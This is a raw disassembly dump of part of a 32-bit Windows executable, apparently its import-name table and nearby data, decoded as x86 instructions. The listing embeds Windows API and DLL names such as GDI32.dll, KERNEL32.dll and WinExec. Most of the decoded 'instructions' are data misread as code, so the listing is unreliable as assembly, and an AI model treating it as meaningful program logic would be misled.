  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
